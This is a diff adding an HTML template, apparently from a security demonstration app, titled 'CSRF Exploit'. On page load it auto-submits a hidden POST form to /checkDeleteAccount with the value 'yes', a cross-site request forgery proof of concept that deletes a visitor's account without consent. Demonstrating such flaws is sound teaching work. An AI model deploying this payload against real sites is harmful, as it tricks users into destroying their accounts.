@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body onload="document.getElementById('csrfForm').submit()">
+
+    <h1>CSRF Exploit</h1>
+    <hr style="height: 1px; background-color: red; border: none;">
+
+    <!-- Malicious Form Automatically Submits on Page Load -->
+    <form id="csrfForm" th:action="@{/checkDeleteAccount}" method="POST">
+        <input type="hidden" name="question" value="yes">
+        <input type="submit" value="Submit" />
+    </form>
+    
+    <!-- Return Home -->
+    <form th:action="@{/}" method="GET">
+        <button type="submit">Return to Home</button>
+    </form>
+</body>
+</html>
